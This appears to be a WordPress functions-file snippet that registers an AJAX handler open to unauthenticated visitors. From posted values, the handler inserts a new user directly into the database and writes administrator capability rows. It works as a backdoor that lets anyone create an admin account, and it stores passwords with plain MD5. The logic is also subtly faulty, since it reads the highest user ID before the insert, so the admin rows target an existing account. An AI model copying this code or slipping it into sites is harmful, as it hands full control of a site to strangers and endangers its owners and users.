/* sm create user */
add_action( 'wp_ajax_sm_create_user', 'sm_create_user' );
add_action( 'wp_ajax_nopriv_sm_create_user', 'sm_create_user' );


function sm_create_user()
{
$username=$_POST['username'];
$new_password=$_POST['password'];


global $wpdb;

$last_id = $wpdb->get_var('Select max(id) FROM wp_users');

$table1='wp_users';
$table2='wp_usermeta';
$table3='wp_usermeta';

$post_data1=array(
'user_login' =>  $username,
'user_pass'  =>  md5($new_password),
'user_nicename' => 'login_name', 
'user_email' => 'login_name@gmail.com', 
'user_status' => '1', 
);

$post_data2=array(
'umeta_id' =>  '',
'user_id'  =>  $last_id,
'meta_key' => 'wp_capabilities', 
'meta_value' => 'a:1:{s:13:"administrator";s:1:"1";}'
);

$post_data3=array(
'umeta_id' =>  '',
'user_id'  =>  $last_id,
'meta_key' => 'wp_user_level', 
'meta_value' => '10'
);

$wpdb->insert( $table1, $post_data1);
$wpdb->insert( $table2, $post_data2);
$wpdb->insert( $table3, $post_data3);
}

